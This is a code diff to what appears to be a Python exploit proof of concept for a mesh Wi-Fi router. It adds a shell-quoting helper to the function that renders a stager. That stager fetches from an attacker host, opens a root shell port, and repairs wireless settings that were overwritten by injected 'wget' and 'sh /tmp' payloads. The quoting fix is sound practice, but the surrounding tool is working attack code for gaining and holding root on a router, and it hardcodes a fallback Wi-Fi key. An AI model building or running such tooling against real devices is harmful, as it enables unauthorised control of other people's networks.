@@ -88,11 +88,11 @@ wget -q -O /dev/null \
       e=$(uci -q get wireless.$s.encryption 2>/dev/null)
       case "$e" in
         *wget*)
-          uci -q set wireless.$s.encryption='{enc24}'
+          uci -q set wireless.$s.encryption={enc24}
           {key24}
           changed=1 ;;
         *"sh /tmp"*)
-          uci -q set wireless.$s.encryption='{enc5}'
+          uci -q set wireless.$s.encryption={enc5}
           {key5}
           changed=1 ;;
       esac
@@ -114,6 +114,15 @@ wget -q -O /dev/null \
 """
 
 
+def _sh(value):
+    """`value` as one single-quoted word for the remote shell.
+
+    Always quotes, so the stager reads the same whether or not a value needs it,
+    and a value that contains a quote cannot end the word and start a command.
+    """
+    return "'" + str(value).replace("'", "'\"'\"'") + "'"
+
+
 def build_stager(attacker, serve_port, shell_port, restore, token,
                  repair_iters=40, repair_interval=5):
     """Render the stager.
@@ -126,18 +135,25 @@ def build_stager(attacker, serve_port, shell_port, restore, token,
     def band(i):
         b = restore[i] if len(restore) > i else {}
         enc = (b.get("encryption") or "none").strip()
-        pw = (b.get("password") or "").strip()
+        # Both values come from the stock router over plain HTTP, so they are
+        # data: quote them for the remote shell instead of dropping them between
+        # hand-written quotes. A valid key containing an apostrophe otherwise
+        # produces an unterminated string that breaks the only root channel, and
+        # a crafted value can close the quote and run a command as root.
+        pw = b.get("password") or ""
+        if not pw.strip():
+            # set_wifi_without_restart already wrote our own pwd= into .key, so
+            # falling back to it keeps the AP joinable with a key we know.
+            pw = "meshpoc12345"
         if enc in ("", "none", "None"):
-            return "none", "uci -q delete wireless.$s.key 2>/dev/null"
-        # set_wifi_without_restart already wrote our own pwd= into .key, so
-        # falling back to it keeps the AP joinable with a key we know.
-        return enc, f"uci -q set wireless.$s.key='{pw or 'meshpoc12345'}'"
+            return _sh("none"), "uci -q delete wireless.$s.key 2>/dev/null"
+        return _sh(enc), f"uci -q set wireless.$s.key={_sh(pw)}"
 
     enc24, key24 = band(0)
     enc5, key5 = band(1)
     return STAGER.format(
         attacker=attacker, serve_port=serve_port, shell_port=shell_port,
-        token=token,
+        token=_sh(token),
         enc24=enc24, key24=key24, enc5=enc5, key5=key5,
         repair_iters=repair_iters, repair_interval=repair_interval,
     ).encode()
@@ -150,7 +166,9 @@ def expected_wifi(restore):
     for i, name in ((0, "2.4G"), (1, "5G")):
         b = restore[i] if len(restore) > i else {}
         enc = (b.get("encryption") or "none").strip()
-        key = (b.get("password") or "").strip() or "meshpoc12345"
+        key = b.get("password") or ""
+        if not key.strip():
+            key = "meshpoc12345"
         out.append((name, b.get("ssid", "?"),
                     "open" if enc in ("", "none", "None") else f"{enc} key={key}"))
     return out
